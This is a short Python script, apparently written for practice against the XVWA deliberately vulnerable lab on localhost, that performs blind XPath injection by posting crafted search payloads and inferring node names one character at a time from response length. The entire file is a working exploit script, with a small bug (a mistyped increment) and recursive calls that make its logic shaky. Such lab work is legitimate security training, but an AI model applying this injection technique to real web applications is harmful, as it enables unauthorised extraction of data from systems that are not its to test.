import requests

column_name = []
character_position = 1

def findTheChar():
    for i in range(65,123):
        table_letter = hex(i)
        global character_position
        url = "http://localhost:9090/xvwa/vulnerabilities/xpath/"
        mydata = {
            "submit": "",
            "search" : "' or substring(name(parent::*[position()=1])," + str(character_position) + ",1)='" + chr(i) + ""
            #"search" : "' or substring(name(//Coffee::*[position()=1]/child::node()[position()=1])," + str(character_position) + ",1)='" + chr(i) + ""
        }
        headers = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language" : "ca,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding" : "gzip, deflate",
            "Content-Type" : "application/x-www-form-urlencoded",
        }

        #proxies = {"http": "http://127.0.0.1:8080"}
        x = requests.post(url, headers=headers, data=mydata)
        print(len(x.text))
        # in the blind sqli injection one, this worked because while the character was higher, the response was true
        # in this one, only when the response is true, it means that that's the character
        if len(x.text) < 12000:
            print("[-] Letter " + chr(i) + " is higher than the character")
            print(column_name)
        else:
            column_name.append(chr(i))
            character_position += 1
            print(character_position)
            print(table_letter)
            print("[+] Letter " + chr(i) + " is not higher than the character")
            print(column_name)
            main()

def main():
    character_position =+ 1
    findTheChar()

main()
